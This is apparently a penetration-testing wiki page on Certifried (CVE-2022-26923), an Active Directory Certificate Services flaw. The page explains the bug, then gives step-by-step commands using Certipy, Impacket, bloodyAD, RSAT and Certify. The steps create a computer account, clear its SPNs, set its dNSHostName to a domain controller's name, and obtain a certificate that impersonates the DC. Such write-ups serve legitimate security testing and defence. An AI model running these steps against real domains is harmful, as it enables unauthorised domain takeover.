---
description: CVE-2022–26923
---

# Certifried

## Theory

[Certifried (CVE-2022-26923)](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) is a vulnerability discovered by [Oliver Lyak](https://twitter.com/ly4k\_) on AD CS that lets a domain-joined user escalate its privileges in the domain.

A domain user creating a computer account obtains the `Validated write to DNS host name`  and `Validated write to service principal name` permissions (among other rights). Therefore, the user is allowed to change the DNS host name (`dNSHostName`) and SPN (`servicePrincipalName`) attributes of the computer account.

Computer accounts (using the `Machine` template) use the value of the `dNSHostName` property for authentication. Attempting to change the `dNSHostName` to match another computer account raises a constraint error.&#x20;

In fact, the moment the `dNSHostName` property is edited, the domain controller makes sure to update the existing SPNs of the account so that the "hostname" part of it is updated to the new DNS hostname. If the SPNs already exist for another account in Active Directory, the domain controllers raises the constraint violation.

The trick found by Oliver goes as follows:

1. clear the SPNs (or at least those that reflect the `dNSHostName` value, i.e. the ones with fully-qualified hostnames, e.g. `HOST/SRV01.DOMAIN.LOCAL`)
2. change to `dNSHostName` to a target's DNS hostname (e.g. `DC.DOMAIN.LOCAL`). The constraint violation won't be raised since there won't be any SPN to update
3. request a certificate for the computer account using the `Machine` template. The Certificate Authority will use the `dNSHostName` value for identification and issue a certificate for the Domain Controller.
4. Authenticate as the DC.

A patch was released in may 2022 to address this vulnerability: [more information here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#db1c) and on [#certificate-mapping](certificate-templates.md#certificate-mapping "mention").

## Practice

Requesting a certificate based on the `Machine` (or `User`) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (`objectSid`), then the patch has been applied.

{% tabs %}
{% tab title="UNIX-like" %}
This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) (Python).

{% code overflow="wrap" %}
```bash
ccertipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
```
{% endcode %}

If Certipy doesn't print `Certificate object SID is [...]` after obtaining the certificate, then the attack can be conducted.

{% hint style="warning" %}
Oliver [underlined](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#08a1) the fact that to fully mitigate the vulnerability, both the KDC and the CA server must be patched.
{% endhint %}
{% endtab %}

{% tab title="Machine" %}
_At the time of writing this recipe, June 2022, no Windows alternative has been found._
{% endtab %}
{% endtabs %}

The first step of the attack consists of creating a computer account, or have the write permission to the `dNSHostName`, and the `SPN` on any other computer account.

{% hint style="success" %}
By default, a domain user can create up to 10 computer accounts by leveraging the [Machine Account Quota](https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota) (MAQ) attribute.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
Verification of the MAQ attribute value using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec).

```bash
cme ldap $DOMAIN_CONTROLLER -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD -M maq
```

Creating a computer account using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer.py script.

```bash
addcomputer.py $DOMAIN_FQDN/$USER_NAME:$USER_PASSWORD -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASSWORD
```
{% endtab %}
{% endtabs %}

The second step is conducted by removing the `RestrictedKrbHost` and `HOST` entry (of the `SPN`), and then modifying the `dNSHostName` to the name of the computer account to usurpate.

{% tabs %}
{% tab title="UNIX-like" %}
Using the [bloodyAD](https://github.com/CravateRouge/bloodyAD) tool.

```bash
# Removing all the SPN entries
python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'

# Adding a dNSHostName value to the name of a computer account to usurpate
python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN_FQDN"]'

# Verifying the setted dNSHostName value and SPN entries
python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
```

{% hint style="info" %}
The Domain Component (DC) will depend on the targeted domain:

* Example with `hacker.com`: `DC=hacker,DC=com`
* Exemple with `the.hacker.com`: `DC=the,DC=hacker,DC=com`
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
Using the [Active Directory RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) tools.

```bash
# Removing all the SPN entries
Set-ADComputer $COMPUTER_NAME -ServicePrincipalName @{}

# Adding a dNSHostName value to the name of a computer account to usurpate
Set-ADComputer $COMPUTER_NAME -DnsHostName $DC_NAME.$DOMAIN_FQDN

# Verifying the setted dNSHostName value and SPN entries
Get-ADComputer $COMPUTER_NAME -properties dnshostname,serviceprincipalname
```
{% endtab %}
{% endtabs %}

The third and last step consists on getting the certificate of the targeted machine account (`$DC_NAME` in the previous command examples).

{% tabs %}
{% tab title="UNIX-like" %}
Using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) we can request a certificate.

```bash
certipy req $DOMAIN_FQDN/$COMPUTER_NAME\$:$COMPUTER_PASSWORD@$CA_SERVER_IP -ca $CA_NAME -template Machine
```

The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
Using [Certify](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwiQmZer1fb3AhVBhRoKHSCyAMoQFnoECAcQAQ\&url=https%3A%2F%2Fgithub.com%2FGhostPack%2FCertify\&usg=AOvVaw0HjmYWwbHvGKTA3-f1iPP0) we can request a certificate.

```bash
Certify.exe request /ca:$DOMAIN_FQDN\$CA_NAME /template:Machine
```

The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" %}

{% embed url="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923" %}

{% embed url="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html" %}

{% embed url="https://tryhackme.com/room/cve202226923" %}
